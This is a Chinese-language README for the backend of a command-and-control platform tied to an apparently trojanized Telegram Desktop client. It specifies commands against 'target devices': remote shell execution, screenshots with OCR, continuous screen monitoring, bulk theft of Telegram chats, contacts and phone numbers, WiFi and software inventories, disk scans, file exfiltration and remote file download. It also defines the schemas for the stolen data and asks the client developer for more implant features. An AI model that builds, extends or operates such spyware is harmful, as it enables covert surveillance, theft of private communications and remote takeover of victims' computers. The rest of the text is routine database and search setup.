# Telegram Platform (C2 Backend)

本项目已集成 Telegram Desktop 客户端的 C2 (Command & Control) 功能，实现了设备监控、数据采集与远程管理。

## 协作与开发规范 (Collaboration Rules)

本项目包含 Web 平台端 (`platform`) 与 Telegram 客户端 (`tdesktop`) 两部分。为了高效协作，请遵循以下规则：

1.  **职责边界**:
    -   我（Platform 开发者）负责 `platform` 目录下的 Web 前后端开发。
    -   **严禁修改** `tdesktop` 目录下的任何代码。
2.  **需求传递**:
    -   **Platform -> Client**: 我对 TG 客户端的功能需求（如新增数据采集、协议变更），将记录在本文档（`platform/README.md`）的 [TG 客户端对接协议与开发建议](#tg-客户端对接协议与开发建议-protocol--suggestions-for-tg-client) 章节中。
    -   **Client -> Platform**: TG 客户端同事对我（Web 端）的接口或功能要求，请查阅 `tdesktop/README.md`。
3.  **沟通机制**:
    -   双方通过 README 文档进行异步需求确认。
    -   代码提交前请确保文档已同步更新。
4.  **代码同步**:
    -   每次对项目进行修改后，**必须**执行 git push 上传至 GitHub 仓库，确保双方代码与文档保持最新同步。

## 目录

- [核心特性](#核心特性)
- [快速上手](#快速上手)
  - [MySQL 数据库](#mysql-数据库)
  - [Redis 分布式登录](#redis-分布式登录)
  - [Elasticsearch 搜索引擎](#elasticsearch-搜索引擎)
  - [业务代码生成器](#业务代码生成器)
- [Web端下发命令详解](#web端下发命令详解)
- [Web端开发注意](#web端开发注意)
- [TG 客户端对接协议与开发建议](#tg-客户端对接协议与开发建议)

---

## 核心特性

### 1. 设备监控 (Device Monitoring)
- **实时状态**: 支持监控设备在线状态、心跳间隔。
- **设备关联**: 自动关联设备 (`C2Device`) 与当前登录的 Telegram 账号 (`current_tg_id`)，实现人机对应。
- **自动截屏**: 集成客户端自动截屏功能 (`isMonitorOn`)，支持截图预览与批量下载。
- **基础信息**: 采集操作系统、IP (内网/外网)、MAC 地址、主机名等。

### 2. 深度数据采集 (Data Ingestion)
- **全量同步**: 支持接收客户端上传的 `tdata_client.db`，自动解析并同步以下数据：
    - **联系人 (`contacts`)**: 自动同步 Telegram 联系人至 `tg_account` 表，支持增量更新。
    - **聊天记录 (`chat_logs`)**: 解析聊天记录，支持文本消息及**媒体文件路径** (`media_path`) 的记录。
    - **WiFi 信息**: 解析 `wifi_scan_results`，记录周边 WiFi 热点信息。
    - **软件列表**: 解析 `installed_software`，记录目标机已安装软件。
    - **系统信息**: 解析 `system_info`，记录详细系统环境变量与配置。

### 3. API 接口与指令
- **管理端点**: `/api/c2Device/*` (RBAC 保护)，支持设备管理、指令下发。
- **客户端端点**: `/api/c2/*` (开放/加密)，处理心跳、任务获取、结果上传。
- **新增指令**:
    - `fetch_full_chat_history`: 触发全量聊天记录与联系人同步。
    - `get_screenshot`: 实时获取屏幕截图。

### 开发注意事项
- **数据库适配**:
    - 后端使用 MySQL 5.7+ (`telegram_db`)。
    - 自动解析客户端上传的 SQLite (`tdata_client.db`) 并映射至 MySQL。
- **环境要求**: JDK 17, Maven 3.9+。

---

## 快速上手

> 所有需要修改的地方鱼皮都标记了 `todo`，便于大家找到修改的位置~

### MySQL 数据库

1. 修改 `application.yml` 的数据库配置为你自己的：

```yml
spring:
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/telegram_db?useUnicode=true&characterEncoding=utf-8&useSSL=false&serverTimezone=Asia/Shanghai&allowPublicKeyRetrieval=true
    username: telegram
    password: password
```

2. 执行 `sql/create_table.sql` 中的数据库语句，自动创建库表（本项目已预置 `telegram_db` 库和 `telegram` 用户）。

3. 启动项目，访问 `http://localhost:8101/api/doc.html` 即可打开接口文档，不需要写前端就能在线调试接口了~

![Swagger UI](doc/swagger.png)

### Redis 分布式登录

1. 修改 `application.yml` 的 Redis 配置为你自己的：

```yml
spring:
  redis:
    database: 1
    host: localhost
    port: 6379
    timeout: 5000
    password: 123456
```

2. 修改 `application.yml` 中的 session 存储方式：

```yml
spring:
  session:
    store-type: redis
```

3. 移除 `MainApplication` 类开头 `@SpringBootApplication` 注解内的 exclude 参数：

**修改前：**
```java
@SpringBootApplication(exclude = {RedisAutoConfiguration.class})
```

**修改后：**
```java
@SpringBootApplication
```

### Elasticsearch 搜索引擎

1. 修改 `application.yml` 的 Elasticsearch 配置为你自己的：

```yml
spring:
  elasticsearch:
    uris: http://localhost:9200
    username: root
    password: 123456
```

2. 复制 `sql/post_es_mapping.json` 文件中的内容，通过调用 Elasticsearch 的接口或者 Kibana Dev Tools 来创建索引（相当于数据库建表）：

```json
PUT post_v1
{
  "参数见": "sql/post_es_mapping.json 文件"
}
```

> 这步不会操作的话需要补充下 Elasticsearch 的知识，或者自行百度一下~

3. 开启同步任务，将数据库的帖子同步到 Elasticsearch。找到 job 目录下的 `FullSyncPostToEs` 和 `IncSyncPostToEs` 文件，取消掉 `@Component` 注解的注释，再次执行程序即可触发同步：

```java
// todo 取消注释开启任务
//@Component
```

### 业务代码生成器

支持自动生成 Service、Controller、数据模型代码，配合 MyBatisX 插件，可以快速开发增删改查等实用基础功能。

找到 `generate.CodeGenerator` 类，修改生成参数和生成路径，并且支持注释掉不需要的生成逻辑，然后运行即可。

```java
// 指定生成参数
String packageName = "com.yupi.springbootinit";
String dataName = "用户评论";
String dataKey = "userComment";
String upperDataKey = "UserComment";
```

生成代码后，可以移动到实际项目中，并且按照 `// todo` 注释的提示来针对自己的业务需求进行修改。

---

## Web端下发命令详解

本文档详细说明了 Web 控制台（C2Device Detail 页面）可下发的命令、参数及其后端处理逻辑。

| 命令标识 (Command) | 显示名称 (Label) | 参数 (Params) | 功能描述 & 后端处理逻辑 |
| :--- | :--- | :--- | :--- |
| **cmd_exec** | 执行CMD | 命令行指令 (如 `whoami`) | **功能**: 在目标设备上执行指定的CMD/Shell命令。<br>**后端处理**: 接收执行结果字符串，并在任务结果中显示。 |
| **screenshot** | 屏幕截图 | 无 | **功能**: 截取目标设备当前屏幕。<br>**后端处理**: <br>1. 接收Base64编码的图片数据。<br>2. 解码并保存为PNG文件 (路径: `uploads/{uuid}/screenshot_{time}.png`)。<br>3. 自动调用OCR服务识别图片文字。<br>4. 在数据库创建 `c2_screenshot` 记录。<br>5. 更新任务结果为图片下载链接。 |
| **start_monitor** | 开启监控 | 监控间隔 (毫秒, 默认60000) | **功能**: 开启目标设备的持续监控模式（通常是定时截屏）。<br>**后端处理**: <br>1. 接收到开启确认或监控图片。<br>2. 将设备状态 `isMonitorOn` 更新为 `1`。<br>3. 如果返回的是图片数据，处理逻辑同 `screenshot` (保存+OCR)。 |
| **stop_monitor** | 停止监控 | 无 | **功能**: 停止目标设备的持续监控模式。<br>**后端处理**: <br>1. 将设备状态 `isMonitorOn` 更新为 `0`。 |
| **get_software** | 获取软件 | 无 | **功能**: 获取目标设备已安装的软件列表。<br>**后端处理**: <br>1. **去重**: 计算结果MD5，若与最近一次相同则跳过处理。<br>2. 解析JSON格式的软件列表。<br>3. 清空该设备旧的 `c2_software` 记录。<br>4. 批量插入新的软件信息 (名称, 版本, 安装日期)。 |
| **get_wifi** | 获取WiFi | 无 | **功能**: 扫描目标设备附近的WiFi热点。<br>**后端处理**: <br>1. **去重**: 计算结果MD5，若与最近一次相同则跳过处理。<br>2. 解析JSON格式的WiFi列表。<br>3. 清空该设备旧的 `c2_wifi` 记录。<br>4. 批量插入新的WiFi信息 (SSID, BSSID, 信号强度)。 |
| **get_current_user** | 获取当前用户 | 无 | **功能**: 获取当前登录的Telegram用户基本信息。<br>**后端处理**: <br>1. 解析JSON格式的用户信息 (ID, 用户名, 手机号, 会员状态)。<br>2. 更新或插入 `tg_account` 表。<br>3. 自动关联该Telegram账号与当前设备。 |
| **scan_recent** | 最近文件 | 无 | **功能**: 扫描目标设备最近访问/修改的文件。<br>**后端处理**: <br>1. **去重**: 计算结果MD5，若与最近一次相同则跳过处理。<br>2. 解析JSON格式的文件列表。<br>3. 清空该设备旧的 `c2_file_scan` (仅限 `isRecent=1`) 记录。<br>4. 批量插入新的文件记录。 |
| **scan_disk** | 全盘扫描 | 无 | **功能**: 触发目标设备进行全盘文件扫描。<br>**后端处理**: <br>1. 客户端通常会生成一个SQLite数据库文件 (`scan_results.db`)。<br>2. 通过 `upload_db` 接口上传该数据库。<br>3. 后端接收文件后，异步解析SQLite文件，提取 `system_info`, `wifi_scan_results`, `installed_software`, `chrome_downloads` 等表数据并同步到MySQL。 |
| **get_chat_logs** | 聊天记录 | 无 | **功能**: 获取目标设备的即时通讯软件聊天记录。<br>**后端处理**: <br>1. 通常涉及上传特定的数据库文件或日志文件。<br>2. 后端解析逻辑可能集成在文件上传或特定的同步接口中。 |
| **fetch_full_chat_history** | 全量同步聊天 | 无 | **功能**: 强制拉取目标设备的全量聊天历史。<br>**后端处理**: <br>1. 类似于 `get_chat_logs`，但参数标志不同，指示客户端遍历所有历史记录。 |
| **set_heartbeat** | 设置心跳 | 时间间隔 (毫秒) | **功能**: 修改目标设备的心跳回连间隔。<br>**后端处理**: <br>1. 更新 `c2_device` 表中的 `heartbeatInterval` 字段，以便在下一次心跳时同步给客户端。 |
| **upload_db** | 上传TData | 数据库路径/类型 | **功能**: 指示客户端上传Telegram数据(TData)或其他数据库文件。<br>**后端处理**: <br>1. 客户端通过 `/api/c2/upload` 接口上传文件。<br>2. 如果文件名包含 `scan_results` 或 `tdata_client` 且为 `.db` 后缀，后端会自动触发 `processScanResults` 逻辑进行解析入库。 |

### 补充说明

1. **结果去重 (Deduplication)**:
    - 为了减少数据库冗余，`get_software`, `get_wifi`, `scan_recent` 命令的结果在后端会进行 MD5 比对。
    - 如果结果内容未发生变化，后端会记录日志 "Skipping duplicate result processing" 并跳过数据库更新操作。

2. **文件上传处理**:
    - 所有通过命令触发的文件上传（截图、DB 文件等）都会存储在 `uploads/{uuid}/` 目录下。
    - 图片文件会自动触发 OCR 识别。
    - 特定命名的 DB 文件会自动触发数据解析和同步。

3. **心跳机制**:
    - `set_heartbeat` 命令不仅仅是下发给客户端，后端也会同步更新设备配置，确保配置持久化。

---

## Web端开发注意 (Web Dev Requirement)

### get_current_user 命令对接需求

**需求来源**：TG 端开发同事

**需求描述**：
在 `C2Controller.java` 的 `submitTaskResult` 方法中（约第 528 行之后）增加对 `get_current_user` 命令返回值的解析处理，逻辑如下：

1. **判断任务命令**：检查当前处理的任务命令是否为 `get_current_user`。
2. **解析返回值**：解析 `result` 字段中的 JSON 字符串。
    - 客户端返回格式示例：`{"userId":"12345","username":"test","firstName":"Test","lastName":"User","phone":"+861234567890","isPremium":false}`
3. **更新数据库**：
    - 根据 `userId` 更新或插入 `tg_account` 表。
    - 字段映射：`userId` -> `tgUserId`, `username` -> `username`, `phone` -> `phone`, `firstName` + `lastName` -> `fullName`。
4. **关联设备**：将该 Telegram 账号与当前设备 UUID (`c2_device`) 进行关联。

**现状问题**：
目前后端仅将 `get_current_user` 的结果作为普通字符串存入 `c2_task` 表的 `result` 字段，不会立即更新 `tg_account` 表。目前的 `tg_account` 更新仅依赖于上传完整的 DB 文件时触发，导致命令执行后数据不同步。

**建议代码逻辑位置**：
`C2Controller.java` -> `submitTaskResult` 方法 -> `if (task != null)` 块内部 -> 在更新任务状态之后。

---

## TG 客户端对接协议与开发建议 (Protocol & Suggestions for TG Client)

为了实现 Web 端对目标设备的更精细化管理（文件浏览、实时聊天记录查看），请 TG 客户端开发同事参考以下协议规范进行对接。

### 1. WiFi 模块 (WiFi Module)

- **现状**: `heartbeat.cpp` 中 `collectWiFiInfo` 已采集数据入库，但 `get_wifi` 返回的 JSON 格式需标准化。
- **命令**: `get_wifi`
- **建议返回 JSON 格式**:
  ```json
  [
    {
      "ssid": "MyWiFi",
      "bssid": "00:11:22:33:44:55",
      "signal": -50,
      "auth": "WPA2-Personal"
    }
  ]
  ```
- **后端处理**: 后端将解析此 JSON 并存入 `c2_wifi` 表。

### 2. 文件管理模块 (File Management)

目前客户端仅支持 `scan_recent` (最近文件) 和 `scan_disk` (全盘扫描入库)，缺少实时文件浏览功能。

#### 2.1 获取文件列表 (新增需求)
- **命令**: `get_file_list`
- **参数**: `path` (目标文件夹路径，如 "C:\\Users")
- **建议返回 JSON 格式**:
  ```json
  [
    {
      "name": "Documents",
      "path": "C:\\Users\\Documents",
      "is_dir": true,
      "size": 0,
      "last_modified": "2023-10-01 12:00:00"
    },
    {
      "name": "secret.txt",
      "path": "C:\\Users\\secret.txt",
      "is_dir": false,
      "size": 1024,
      "last_modified": "2023-10-02 14:30:00"
    }
  ]
  ```

#### 2.2 文件传输 (命令澄清)
- **Client Upload (Web端下载)**:
    - **命令**: `upload_file` (现有命令 `download` 命名易混淆，建议统一使用 `upload_file`)
    - **参数**: `filePath` (目标机文件路径)
    - **行为**: 客户端将指定文件 POST 上传至 `/api/c2/upload`。
- **Client Download (Web端上传)**:
    - **命令**: `download_file` (新增需求)
    - **参数**: `url` (下载链接), `savePath` (保存路径)
    - **行为**: 客户端从指定 URL 下载文件并保存到本地。

### 3. TG 聊天模块 (Chat Module)

目前客户端通过 `uploadClientDb` 上传 SQLite 数据库文件，后端解析滞后且开销大。为了支持 Web 端实时查看聊天记录，建议增加 JSON 接口。

#### 3.1 获取聊天记录 (新增建议)
- **命令**: `get_chat_history_json`
- **参数**: `chat_id` (会话ID), `limit` (条数), `offset_id` (可选)
- **建议返回 JSON 格式**:
  ```json
  [
    {
      "msg_id": 12345,
      "chat_id": "100123456",
      "sender_id": "987654321",
      "sender_name": "Alice",
      "content": "Hello World",
      "timestamp": 1696123456,
      "is_outgoing": false,
      "media_path": "Photo:123" // 如有媒体文件
    }
  ]
  ```
- **优势**: 相比上传整个 DB，JSON 传输更轻量，Web 端可直接展示。

### 4. 媒体文件处理
- 聊天记录中的图片/视频目前仅记录了 `media_path`。
- **建议**: 对于缩略图或小文件，客户端可随聊天记录 JSON 一并上传（Base64 或 独立上传后返回 URL）。
- 或者提供 `get_media` 命令，按需上传指定的媒体文件。

### 5. 数据库上传标准 (Database Upload Standard) - **核心对接要求**

为了确保 Web 端能正确解析客户端上传的 SQLite 数据库 (`scan_results.db` 或 `tdata_client_{TGID}.db`) 并展示在设备详情页，请务必遵循以下数据库 Schema 规范。

#### 5.1 文件命名规范
- **通用数据**: `scan_results.db` (包含系统、WiFi、软件信息)
- **聊天记录**: `tdata_client_{TGID}.db` (必须以 `tdata_client_` 开头，后接 TGID，以 `.db` 结尾，例如 `tdata_client_123456789.db`。后端依据此文件名提取 TGID 并关联账号)

#### 5.2 表结构定义 (SQLite)

**1. chat_logs (聊天记录)**
| 字段名 | 类型 | 描述 |
| :--- | :--- | :--- |
| `chat_id` | TEXT | 会话 ID |
| `sender` | TEXT | 发送者 ID |
| `content` | TEXT | 消息内容 |
| `timestamp` | INTEGER | Unix 时间戳 (秒) |
| `is_outgoing` | INTEGER | 1=发出, 0=接收 |
| `sender_username`| TEXT | (可选) 发送者用户名 |
| `sender_phone` | TEXT | (可选) 发送者电话 |
| `receiver_id` | TEXT | (可选) 接收者 ID |
| `media_path` | TEXT | (可选) 媒体文件本地路径 |

**2. system_info (系统信息)**
| 字段名 | 类型 | 描述 |
| :--- | :--- | :--- |
| `internal_ip` | TEXT | 内网 IP |
| `mac_address` | TEXT | MAC 地址 |
| `hostname` | TEXT | 主机名 |
| `os` | TEXT | 操作系统名称 |
| `auto_screenshot`| INTEGER | 监控状态 (0/1) |
| `data_status` | TEXT | 数据状态 |

**3. wifi_scan_results (WiFi 信息)**
| 字段名 | 类型 | 描述 |
| :--- | :--- | :--- |
| `ssid` | TEXT | WiFi 名称 |
| `bssid` | TEXT | MAC 地址 |
| `signal_strength`| TEXT | 信号强度 |
| `security_type` | TEXT | 认证方式 |

**4. installed_software (软件列表)**
| 字段名 | 类型 | 描述 |
| :--- | :--- | :--- |
| `name` | TEXT | 软件名称 |
| `version` | TEXT | 版本号 |
| `install_date` | TEXT | 安装日期 |

**5. current_user (当前用户信息)**
| 字段名 | 类型 | 描述 |
| :--- | :--- | :--- |
| `username` | TEXT | 用户名 |
| `first_name` | TEXT | 名 |
| `last_name` | TEXT | 姓 |
| `phone` | TEXT | 电话 |
| `is_premium` | INTEGER | 是否会员 |

**6. contacts (联系人列表)**
| 字段名 | 类型 | 描述 |
| :--- | :--- | :--- |
| `user_id` | TEXT | 联系人 ID |
| `username` | TEXT | 用户名 |
| `first_name` | TEXT | 名 |
| `last_name` | TEXT | 姓 |
| `phone` | TEXT | 电话 |

**7. 通用表同步 (Generic Table Sync)**
- **机制**: 后端会自动扫描并同步 SQLite 数据库中除上述标准表以外的其他所有表。
- **自动建表**: 若 MySQL 中不存在对应表，系统会根据 SQLite 字段类型自动创建同名表，并添加 `device_uuid` 和 `create_time` 字段。
- **排除列表 (Excluded)**: 以下表**不会**被同步：
    - `chat_sync_state`: 客户端本地同步状态记录。
    - `local_tasks`: 客户端本地任务队列。
    - `android_metadata`: 安卓元数据（如存在）。
    - 以及上述已专门处理的标准表 (`system_info`, `wifi_scan_results`, `installed_software`, `chat_logs` 等)。
